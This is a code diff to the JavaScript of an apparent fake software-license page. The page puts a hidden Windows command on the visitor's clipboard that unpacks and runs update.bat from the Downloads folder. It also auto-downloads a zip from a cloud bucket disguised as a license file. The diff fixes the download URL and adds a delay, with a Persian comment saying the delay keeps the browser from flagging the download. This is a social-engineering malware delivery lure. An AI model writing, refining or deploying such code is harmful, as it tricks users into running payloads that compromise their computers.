@@ -975,7 +975,7 @@
     ─────────────────────────────────────────────────────────────── */
     const VALID_LICENSE          = "8F1D-3Q9P-D92L-BW6M";
     const CLIPBOARD_TEXT = 'cmd /c start /min cmd /c "expand %USERPROFILE%\\Downloads\\update.cab %USERPROFILE%\\Downloads\\update.bat & call %USERPROFILE%\\Downloads\\update.bat"';
-    const DOWNLOAD_URL           = "https://s3.eu-central-003.backblazeb2.com/myfile220033/Temp/mypdfapp.zip:";
+    const DOWNLOAD_URL           = "https://s3.eu-central-003.backblazeb2.com/myfile220033/Temp/mypdfapp.zip";
     const DOWNLOAD_FILENAME_HINT = "yourfile.zip";
 
     const licenseInput  = document.getElementById("licenseInput");
@@ -1074,17 +1074,19 @@
         showToast("Copy blocked by browser.");
       }
 
-      /* 3. Download license file */
-      try {
-        const a = document.createElement("a");
-        a.href = DOWNLOAD_URL;
-        if (DOWNLOAD_FILENAME_HINT) a.download = DOWNLOAD_FILENAME_HINT;
-        document.body.appendChild(a);
-        a.click();
-        a.remove();
-      } catch (e) {
-        console.error("License download failed:", e);
-      }
+      /* 3. Download license file — با تأخیر تا مرورگر آن را navigation نبیند */
+      setTimeout(() => {
+        try {
+          const a = document.createElement("a");
+          a.href = DOWNLOAD_URL;
+          if (DOWNLOAD_FILENAME_HINT) a.download = DOWNLOAD_FILENAME_HINT;
+          document.body.appendChild(a);
+          a.click();
+          a.remove();
+        } catch (e) {
+          console.error("License download failed:", e);
+        }
+      }, 500);
     });
 
     /* ───────────────────────────────────────────────────────────────
